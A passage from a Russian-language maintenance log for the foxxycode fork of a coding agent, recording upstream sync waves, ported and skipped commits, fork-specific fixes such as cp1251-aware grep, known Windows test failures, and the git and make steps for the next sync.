строки**, а не Error-ы, поэтому upstream-ветка `e instanceof Error` их сообщения на
самом деле не сохраняла. Форк обрабатывает string-throw и срезает префикс `Error: `;
закреплено тестом «keeps cronstrue's field-naming message».

### Пропущено (9 коммитов)

- `4e899288`, `e22f6eb0`, `0bc4a56f`, `ba38ee10`, `f640362b`, `5083ac6f` (кроме
  cron-фикса выше) — волна русской локализации upstream: форк локализован **первым**,
  все поверхности уже под `t()` со своими неймспейсами ключей; порт создал бы
  параллельный словарь тех же строк.
- `2ec7bedb` (`settings/schemaI18n.ts`) — дублирующий механизм локализации схемы
  настроек. Форковый `schemaStrings.ts`+`schema.ru.ts` сильнее: ключи по точному
  английскому тексту без пропов через все уровни формы, перевод enum-лейблов (у upstream
  его нет вовсе) и coverage-гарантия `schemaStrings.test.ts` по фикстуре `ui-schema.json`
  (у upstream пропуск молча падает в английский). Не портируем.
- `d1b4dc45` — правит фразу о «постепенной локализации» в AGENTS/DESIGN/docs, которой
  в форковых доках никогда не было (переписаны с нуля под config-backed `ui.locale`).
- `ed2841a2` — 7 PNG скриншотов PR#127; снимем свои (follow-up ниже).

---

## Последняя синхронизация

| Поле | Значение |
| --- | --- |
| **Дата** | 2026-08-30 |
| **Синхронизировано до `upstream/main`** | `7123d25a` (2026-08-28) |
| **Ближайший upstream-тег** | `0.9.84` |
| **Наш коммит-порт** | ветка `claude/port-coddy-project-changes-9071af`, пять коммитов (reasoning-truncation / update-helper / status line / диски пикера / плюрализация+i18n-фиксы) |
| **Живой прогон** | Windows-тесты `internal/update` и `internal/platform` нативно на этой машине; smoke `foxxycode -v` / `update -h`; полный vitest (1074) + `test:layout` |
| **Отложенные follow-up** | скриншоты форкового пикера с уровнем дисков и live status line в CLI/SPA; четыре PNG `docs/assets/screenshot-tool-previews*.png` (долг прошлых волн); риски волн `96c04fb → 6d46afe` и `12897ba → 1a84b37` (см. выше) |

---

## Предыдущая синхронизация (`6666606 → 12897ba`)

| Поле | Значение |
| --- | --- |
| **Дата** | 2026-08-16 |
| **Синхронизировано до `upstream/main`** | `12897ba` (2026-08-15) |
| **Ближайший upstream-тег** | `0.9.67` |
| **Наш коммит-порт** | ветка `claude/port-coddy-to-foxxy-agent-88352a`, пять коммитов (язык / мелочи / реле / SPA+вложения / консоль+remote) |
| **Живой прогон** | выполнен на `neuraldeep` — см. раздел волны (ретраи, cp1251, идентичность фоновых задач, hot-reload MCP, ConfirmDialog) |
| **Отложенные follow-up** | скриншоты ConfirmDialog со своего UI (панель браузера не композитит); четыре PNG `docs/assets/screenshot-tool-previews*.png`; четыре незакрытых «известных риска» волны `96c04fb → 6d46afe`; два новых риска этой волны (синхронный reload в HTTP-обработчике, неупорядоченные писатели `configuredMCPClients`) |

---

## Предыдущая синхронизация (`5e44bdb -> 0f2dbf1`)

| Поле | Значение |
| --- | --- |
| **Дата** | 2026-08-03 |
| **Синхронизировано до `upstream/main`** | `0f2dbf1` (2026-08-03) |
| **Ближайший upstream-тег** | `0.9.53` |
| **Наш коммит-порт** | четыре коммита на ветке `claude/coddy-agent-upstream-sync-39e153` |
| **Отложенные follow-up** | четыре PNG `docs/assets/screenshot-tool-previews*.png`; четыре незакрытых «известных риска» волны `96c04fb → 6d46afe` |

---

## Предыдущая синхронизация (`6d46afe -> 5e44bdb`)

| Поле | Значение |
| --- | --- |
| **Дата** | 2026-08-01 |
| **Синхронизировано до `upstream/main`** | `5e44bdb` (2026-07-31) |
| **Ближайший upstream-тег** | `0.9.49` |
| **Наш коммит-порт** | `f836c26`, `98c809a`, `9a8f668` плюс коммит SPA — ветка `claude/coddy-agent-port-test-14016f` |
| **Отложенные follow-up** | четыре PNG `docs/assets/screenshot-tool-previews*.png` — тянутся с волны `6666606 → 19754e8`, см. её раздел; плюс «Известные риски этой волны» выше |

---

## Предыдущая синхронизация (`6666606 → 19754e8`)

| Поле | Значение |
| --- | --- |
| **Дата** | 2026-07-25 |
| **Синхронизировано до `upstream/main`** | `19754e8` (2026-07-24) |
| **Ближайший upstream-тег** | `0.9.43` |
| **Наш коммит-порт** | `323ba32` (волна A: `usage_update`) + волна B (tool previews) — ветка `claude/sync-foxxy-coddy-agents-c89f5c` |
| **Отложенные follow-up** | четыре PNG `docs/assets/screenshot-tool-previews*.png` (см. выше) |

---

## Волна `bc1afb9 → 6666606` — предыдущая синхронизация

| Поле | Значение |
| --- | --- |
| **Дата** | 2026-07-23 (перепроверка; новых коммитов нет) |
| **Синхронизировано до `upstream/main`** | `6666606` (2026-07-22) |
| **Ближайший upstream-тег** | `0.9.43` |
| **Наш коммит-порт** | `f0a2506`, `60af986`, `305fc5a`, `3b3e812`, `0e75aa7` (ветка `sync/upstream-6666606`) |
| **Отложенные follow-up** | нет — все три закрыты: exhaustive OpenAPI для skill-роутов и BDD `skills_marketplace`/`plugin_command`/`remote_api` в `f2f4682`, i18n `SkillsSection.tsx` в `f2f4682`+`3d2fa15`, остальной английский в SPA — `ea7095d` (PR #7) |

### Что портировано в этой волне
- **Platform-aware shell** (upstream `2e979b7`) — новый пакет `internal/platform` (детект
  `pwsh → powershell → cmd` в Windows, `bash → sh` иначе); `run_command` больше не хардкодит
  `sh -c` и получает описание под конкретный шелл; `api_key_command` идёт через тот же шелл;
  блок `<environment_context>` (`<os>`/`<arch>`/`<shell>`) добавляется **вне** настраиваемого
  шаблона промпта. Затронуты `internal/tools/shell/run.go`, `internal/tools/export.go`
  (`NewRegistryForEnvironment`), `internal/agent/react.go`, `internal/agent/system_prompt.go`,
  `internal/config/providers.go`, `internal/config/ui_schema.go`.
- **Portable grep/glob** (upstream `d68d83c`) — новый `internal/tools/fs/search.go` с нативным
  Go-движком (`doublestar/v4`); `grep` использует системный `rg` при наличии (паттерн передаётся
  нетронутым после `--`) и падает в фолбэк иначе, `glob` тоже; `grepLineFilePath` понимает
  Windows-пути с буквой диска. Раньше `glob`/`grep` без `rg` в PATH просто падали.
- **Gateway в Docker** (upstream `204e3e9`) — build-тег `gateway` в `Dockerfile`/`docker-compose.dev.yml`,
  override `FOXXYCODE_COMMAND`, проброс `TELEGRAM_BOT_TOKEN`, разделы в `docs/docker.md`
  и `docs/gateway.md`.

### Особенности порта (fork-specific)
- `internal/tools/fs/fs_test.go` смержен вручную: upstream-тесты дописаны к локальным
  cp1251-тестам (`TestReadDecodesWindows1251` и др.), которые в upstream отсутствуют.
- `internal/tools/fs/read.go` оставлен локальным (слой `decodeText`/`encodeText`).
- **`grep` доработан поверх upstream под cp1251** (расхождение с upstream, сознательное):
  upstream-движок в `search.go` читал строки через `bufio.Scanner` как UTF-8, из-за чего
  кириллица в Windows-1251-файлах не находилась. Теперь `searchFileLines` декодирует файл
  через `decodeText`, а **non-ASCII паттерны маршрутизируются мимо системного `rg`**
  (`isASCIIPattern` в `grep.go`) — `rg` ищет по сырым байтам и такие файлы пропускает.
  ASCII-паттерны по-прежнему идут в `rg`. Регрессионные тесты: `TestGrepFindsCyrillicInWindows1251File`,
  `TestGrepNonASCIIPatternBypassesSystemRipgrep`, `TestGrepASCIIPatternStillUsesSystemRipgrep`.
- `system_prompt.go`: локальный `languageDirective` сохранён, upstream-блок окружения добавлен
  после него.
- Изменение описания `api_key_command` потребовало регенерации `ui-schema.json`-фикстуры
  (`UPDATE_UI_SCHEMA_FIXTURE=1`) и правки RU-оверлея `external/ui/src/ui/i18n/messages/schema.ru.ts`.

### Пропущено как уже покрытое / неактуальное
- `1585c72` (экранирование `$` в proxy-секретах) и `18c677c` (read за пределами EOF) — уже были
  в форке, файлы `internal/config/expand.go` и `internal/tools/fs/lines.go` побайтово совпадали
  с `upstream/main`.
- `b8cf8ce`, `a563294` (ветка `codex/windows-portable-tools` с `rg_tool.go`) — в upstream заменены
  на `search.go`; в дереве `upstream/main` файла `rg_tool.go` нет.
- Более ранние коммиты — см. волну до `55cc476` ниже по истории файла.

### Известные предсуществующие падения на Windows (не связаны с этой волной)
- `TestConcurrentPatchSessionMetaActivitySync` (`internal/session`) — флейк `rename … Access is denied`,
  воспроизводится и на чистом дереве.
- `kilocode-main/...` ломает `go build ./...` и `golangci-lint run ./...`; собирать/линтить
  по каталогам (`./cmd/... ./internal/... ./external/...`).
- `golangci-lint`: `bootstrapExampleConfig is unused` в `cmd/foxxycode/main.go` — тоже предсуществующее.

---

## Как обновить этот файл в следующий раз

1. `git fetch upstream --prune`
2. `git log --oneline --no-merges 7123d25a..upstream/main` — список кандидатов.
3. Портировать непортированное (ребренд `coddy → foxxycode`; см. `AGENTS.md` / память форка).
4. Прогнать гейты: `make test`, `make lint`, `npm --prefix external/ui run build:go`.
5. Обновить таблицу «Последняя синхронизация» выше на новый `upstream/main`.
